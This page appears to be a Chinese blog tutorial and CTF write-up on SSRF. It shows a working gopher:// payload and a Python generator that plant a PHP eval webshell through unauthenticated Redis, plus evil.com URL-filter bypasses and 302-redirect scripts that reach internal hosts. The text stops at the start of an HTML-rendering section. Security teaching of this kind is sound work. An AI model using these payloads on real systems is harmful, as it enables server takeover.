@@ -1,0 +1,761 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="X2n" />
+
+  <!-- 搜索引擎摘要：优先页面自定义 description / excerpt / 正文前 160 字，最后回落到站点 description -->
+  
+  
+    <meta name="description" content="SSRF打Redis CTF show的WEB入门360关卡，打Redis。 源码如下： 1 2 3 4 5 6 7 8 9 10 11 &amp;lt;?php error_reporting ( 0 ); highlight_file ( __FILE__ ); $url = $_POST [ &amp;#x27;url&amp;#x27…" />
+  
+  
+    <meta name="keywords" content="X2n,Web安全,漏洞挖掘,渗透测试,SRC,内网渗透,Kubernetes 安全,云安全,安全研究,技术博客" />
+  
+
+  
+  
+  <title>
+    
+      SSRF漏洞篇 
+      
+      
+      |
+    
+     Keep your passion for what you love !
+  </title>
+
+  
+
+  <!-- Canonical URL：避免重复内容降权 -->
+  <link rel="canonical" href="https://x2nn.github.io/2024/07/25/SSRF漏洞篇/" />
+
+  <!-- Open Graph (Facebook / 微信 / 飞书 / LinkedIn) -->
+  <meta property="og:site_name" content="Keep your passion for what you love !" />
+  <meta property="og:title" content="SSRF漏洞篇 | Keep your passion for what you love !" />
+  
+    <meta property="og:description" content="SSRF打Redis CTF show的WEB入门360关卡，打Redis。 源码如下： 1 2 3 4 5 6 7 8 9 10 11 &amp;lt;?php error_reporting ( 0 ); highlight_file ( __FILE__ ); $url = $_POST [ &amp;#x27;url&amp;#x27…" />
+  
+  <meta property="og:type" content="article" />
+  <meta property="og:url" content="https://x2nn.github.io/2024/07/25/SSRF漏洞篇/" />
+  <meta property="og:image" content="https://x2nn.github.io/images/avatar.png" />
+  <meta property="og:locale" content="zh_CN" />
+  
+    
+      <meta property="article:published_time" content="2024-07-24T16:52:28.000Z" />
+    
+    
+      <meta property="article:modified_time" content="2026-01-15T01:41:31.628Z" />
+    
+    
+      <meta property="article:tag" content="SSRF" />
+    
+      <meta property="article:tag" content="gopher协议" />
+    
+  
+
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="SSRF漏洞篇 | Keep your passion for what you love !" />
+  
+    <meta name="twitter:description" content="SSRF打Redis CTF show的WEB入门360关卡，打Redis。 源码如下： 1 2 3 4 5 6 7 8 9 10 11 &amp;lt;?php error_reporting ( 0 ); highlight_file ( __FILE__ ); $url = $_POST [ &amp;#x27;url&amp;#x27…" />
+  
+  <meta name="twitter:image" content="https://x2nn.github.io/images/avatar.png" />
+
+  <!-- RSS 订阅：浏览器与阅读器可自动发现 -->
+  <link rel="alternate" type="application/atom+xml" title="Keep your passion for what you love ! Atom Feed" href="/atom.xml" />
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+  
+<script src="/js/progressBar.js"></script>
+
+  
+<script src="/js/headerlinkCopy.js"></script>
+
+
+  
+
+  
+
+  <!-- Cloudflare Web Analytics（零 cookie、隐私友好） -->
+  
+    <script defer src="https://static.cloudflareinsights.com/beacon.min.js"
+            data-cf-beacon='{"token": "1e1fd0957b6d4ca8a09a54a598b7b525"}'></script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="" loading="lazy" decoding="async">
+      
+    </a>
+    <div class="nickname"><a href="/"></a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Category</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+        <li class="nav-item" data-path="/collections/">
+          <a href="/collections/">Collections</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.10/dist/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">SSRF漏洞篇</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2026-01-15 09:41:31
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/SSRF/" title="SSRF">
+                    #SSRF
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/gopher%E5%8D%8F%E8%AE%AE/" title="gopher协议">
+                    #gopher协议
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="分类"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/Web%E5%AE%89%E5%85%A8/" title="Web安全">
+                    <b>#</b> Web安全
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h2 id="ssrf打redis" tabindex="-1"><a class="headerlink" href="#ssrf打redis" aria-hidden="true"></a> SSRF打Redis</h2>
+<p>CTF show的WEB入门360关卡，打Redis。</p>
+<p>源码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>发现6379端口开放，6379端口，一般为Redis。</p>
+<p><img src="/2024/07/25/SSRF%E6%BC%8F%E6%B4%9E%E7%AF%87/1.png" alt loading="lazy" decoding="async"></p>
+<p>打入Payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252428%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B1%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25245%250D%250A1.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A</span><br></pre></td></tr></table></figure>
+<p>成功。</p>
+<p><img src="/2024/07/25/SSRF%E6%BC%8F%E6%B4%9E%E7%AF%87/2.png" alt loading="lazy" decoding="async"></p>
+<h3 id="使用到了gopher协议" tabindex="-1"><a class="headerlink" href="#使用到了gopher协议" aria-hidden="true"></a> 使用到了gopher协议</h3>
+<blockquote>
+<p>Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议，当然现在 Gopher 协议已经慢慢淡出历史。<br>
+Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。</p>
+</blockquote>
+<p>特定的协议开头，“_”后面跟着内容部分。</p>
+<p><code>gopher://127.0.0.1:6379/_</code></p>
+<h3 id="redis的语法" tabindex="-1"><a class="headerlink" href="#redis的语法" aria-hidden="true"></a> Redis的语法</h3>
+<p>上述使用的Payload是基于存在Redis未授权漏洞的情况下，无需密码，下面我们来简单分析一下使用的payload。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">*3</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">3</span></span><br><span class="line">set</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1</span></span><br><span class="line">1</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">28</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*4</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">6</span></span><br><span class="line">config</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">3</span></span><br><span class="line">set</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">3</span></span><br><span class="line">dir</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">13</span></span><br><span class="line">/var/www/html</span><br><span class="line">*4</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">6</span></span><br><span class="line">config</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">3</span></span><br><span class="line">set</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">10</span></span><br><span class="line">dbfilename</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">5</span></span><br><span class="line">1.php</span><br><span class="line">*1</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">4</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+<p><code>*3</code>指的是三个变量，<code>$3</code>指的是字符的长度为3。</p>
+<p>正常我们使用Redis的语法，首先需要进行登录，存在未授权可直接登录，不存在则需要密码登录。</p>
+<p><code>redis-cli -h 192.168.73.150 -a password</code></p>
+<p>上传Webshell。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set 1 &lt;?php$&#123;IFS&#125;eval($_POST[1]);?&gt;</span><br><span class="line">config set dir /var/www/html</span><br><span class="line">config set dbfilename 1.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><em><strong>注意</strong></em>：我注意到很多打CTF的同学使用的<code>Gopherus</code>去生成的payload，我发现<code>Gopherus</code>在生成payload时，使用到了<code>flushall</code>命令，该命令用于清空 Redis 服务器中的所有数据库，数据会被永久删除，切记不可用于实际环境中！</p>
+</blockquote>
+<p>网上翻到的脚本，实测可行，SSRF打Redis的redis_shell.py如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line"><span class="comment">#shell</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php eval($_POST[1]);?&gt;\n\n&quot;</span></span><br><span class="line"><span class="comment">#文件名</span></span><br><span class="line">filename=<span class="string">&quot;1.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line"><span class="comment">#redis密码</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[</span><br><span class="line">    <span class="comment">#&quot;auth passwd&quot;,</span></span><br><span class="line">     <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">     <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">     <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">     <span class="string">&quot;save&quot;</span></span><br><span class="line">     ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line"><span class="built_in">print</span>(cmd)</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redis_format</span>(<span class="params">arr</span>):</span><br><span class="line">    CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">    cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += quote(redis_format(x))</span><br><span class="line">    <span class="comment">#最后的结果要对&quot;_&quot;后面进行一次url编码</span></span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>
+<h3 id="⚠️注意点" tabindex="-1"><a class="headerlink" href="#⚠️注意点" aria-hidden="true"></a> ⚠️注意点</h3>
+<p>在使用SSRF打Redis时，对于&quot;gopher://127.0.0.1:6379/_&quot;后的内容需要进行一次url编码。</p>
+<h2 id="ssrf的绕过" tabindex="-1"><a class="headerlink" href="#ssrf的绕过" aria-hidden="true"></a> SSRF的绕过</h2>
+<p>学习SSRF不能仅仅局限于CTF比赛中，更多的是要运用在实际的环境中。</p>
+<h3 id="绕过url匹配字符的限制" tabindex="-1"><a class="headerlink" href="#绕过url匹配字符的限制" aria-hidden="true"></a> 绕过URL匹配字符的限制</h3>
+<p><strong>后端对请求的URL进行字符匹配检测。</strong></p>
+<p>下面，<code>evil.com</code>为恶意的域名，<code>target.com</code>为正常的业务域名。</p>
+<p>例如，直接判断URL中是否包含某个<code>target.com</code>。使用@进行绕过。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://target.com@evil.com</span><br></pre></td></tr></table></figure>
+<p>例如，使用字符串匹配的方式，判断域名中是否存在某个子域名，如必须包含<code>qq.com</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://target.com.evil.com</span><br></pre></td></tr></table></figure>
+<p><strong>解析的差异。</strong></p>
+<p>例如，前后端分离，对URL的解析差异不同，绕过检测。有的后端会把<code>\.</code>和<code>\@</code>解析成<code>.</code>和<code>@</code>，则会解析到<code>evil.com</code>。若把<code>\</code>解析为<code>/</code>，则不存在问题，还是正常解析到<code>target.com</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://target.com\.evil.com</span><br><span class="line">https://target.com\@evil.com</span><br></pre></td></tr></table></figure>
+<h3 id="直接302跳转" tabindex="-1"><a class="headerlink" href="#直接302跳转" aria-hidden="true"></a> 直接302跳转</h3>
+<p>利用302跳转，跳转到内网的地址上，实现<code>SSRF</code>。</p>
+<p>使用<code>php</code>代码实现，<code>302.php</code>如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// 设置跳转目标内网URL</span></span><br><span class="line">    <span class="variable">$target_url</span>=<span class="string">&#x27;http://127.0.0.1/&#x27;</span>;</span><br><span class="line">    <span class="comment">// 发送302跳转头信息</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: &#x27;</span> . <span class="variable">$target_url</span>, <span class="literal">true</span>, <span class="number">302</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<h3 id="有条件的302跳转" tabindex="-1"><a class="headerlink" href="#有条件的302跳转" aria-hidden="true"></a> 有条件的302跳转</h3>
+<p>要考虑实际环境中是否有相关的过滤。我自己想到的过滤有以下几种，具体要根据实际情况分析。</p>
+<h4 id="1、后端验证了跳转的目标域名" tabindex="-1"><a class="headerlink" href="#1、后端验证了跳转的目标域名" aria-hidden="true"></a> (1)、后端验证了跳转的目标域名</h4>
+<p>后端代码验证了跳转的目标URL的域名，是否为白名单中的域名。绕过这种验证，需要找到白名单域名中的一个302跳转，即可实现绕过。</p>
+<p>自己的服务器上部署<code>r.php</code>，对应的URL为<code>https://evil.com/r.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// 设置跳转目标内网URL</span></span><br><span class="line">    <span class="variable">$target_url</span>=<span class="string">&#x27;http://127.0.0.1/&#x27;</span>;</span><br><span class="line">    <span class="comment">// 发送302跳转头信息</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: &#x27;</span> . <span class="variable">$target_url</span>, <span class="literal">true</span>, <span class="number">302</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>存在302跳转的白名单域名，如下：</p>
+<p><code>https://vulnerable.com/?redirect_url=</code></p>
+<p>则跳转的地址为：</p>
+<p><code>https://vulnerable.com/?redirect_url=https%3A%2F%2Fevil.com%2Fr.php</code></p>
+<p><code>vulnerable.com</code>为白名单域名，绕过了白名单的限制。</p>
+<h4 id="2、后端验证了请求返回的数据包" tabindex="-1"><a class="headerlink" href="#2、后端验证了请求返回的数据包" aria-hidden="true"></a> (2)、后端验证了请求返回的数据包</h4>
+<p>后端代码对请求的URL的返回结果进行了验证。返回的响应数据包中的每一个内容都有可能作为后端限制的条件，这里绕过限制的方法就是去想办法构造，满足后端代码的判断条件，然后再进行302的跳转。</p>
+<p><strong>例如</strong>，即后端验证请求的URL返回的状态码只能是特定的，如200。此时要在使用dnslog进行<code>SSRF</code>测试的时候注意，后端代码对URL进行了几次请求，有可能的情况是先对URL请求一次验证状态码是200，满足条件后，后续几次请求未对返回内容进行验证。此时我们可以编写代码，进行请求次数的限定，第一次请求返回200，第n次请求返回302跳转，跳转到内网的地址中。</p>
+<p>使用<code>nodejs</code>实现<code>ssrf.js</code>，代码如下：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> requestCount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/1&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    requestCount++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> personalInfo = &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;张三&quot;</span>,</span><br><span class="line">        <span class="attr">age</span>: <span class="number">28</span>,</span><br><span class="line">        <span class="attr">email</span>: <span class="string">&quot;zhangsan@example.com&quot;</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 记录访问日志</span></span><br><span class="line">    <span class="keyword">const</span> logMessage = &#123;</span><br><span class="line">        <span class="attr">timestamp</span>: <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">toISOString</span>(),</span><br><span class="line">        <span class="attr">requestCount</span>: requestCount,</span><br><span class="line">        <span class="attr">method</span>: req.<span class="property">method</span>,</span><br><span class="line">        <span class="attr">headers</span>: req.<span class="property">headers</span>,</span><br><span class="line">        <span class="attr">query</span>: req.<span class="property">query</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;访问日志:&quot;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(logMessage, <span class="literal">null</span>, <span class="number">2</span>));</span><br><span class="line">  	<span class="comment">//请求的次数</span></span><br><span class="line">    <span class="keyword">if</span> (requestCount &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// 返回状态 200 和个人信息的 JSON 数据</span></span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">json</span>(personalInfo);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 第 5 次访问，返回状态 302 跳转到百度</span></span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="number">302</span>, <span class="string">&#x27;http://127.0.0.1/&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`服务器正在运行，访问 http://localhost:<span class="subst">$&#123;PORT&#125;</span>/1`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>请求第1次，返回正常的个人信息内容，请求第2次，则进行302跳转，跳转到内网中。</p>
+<p><strong>例如</strong>，后端代码验证的请求的URL只能是特定的<code>User-Agent</code>头。</p>
+<p>使用<code>php</code>实现<code>1.php</code>，代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// 获取请求的 User-Agent</span></span><br><span class="line">    <span class="variable">$userAgent</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">    <span class="comment">// 检查 User-Agent 是否包含 okhttp/3.12.1</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$userAgent</span>, <span class="string">&#x27;okhttp/3.12.1&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: https://www.baidu.com&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>(); <span class="comment">// 确保停止脚本执行</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    	<span class="comment">// 设置跳转目标URL</span></span><br><span class="line">    		<span class="variable">$target_url</span> = <span class="string">&#x27;http://127.0.0.1/&#x27;</span>;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: &#x27;</span> . <span class="variable">$target_url</span>, <span class="literal">true</span>, <span class="number">302</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="内网html渲染" tabindex="-1"><a class="headerlink" href="#内网html渲染" aria-hidden="true"></a> 内网html渲染</h3>
+<p>后端代码在处理前端传输的<code>html</code>内容时，会对输入的内容进行渲染，例如，文本转换为PDF、在线简历生成等可能存在<code>html</code>渲染的功能点。</p>
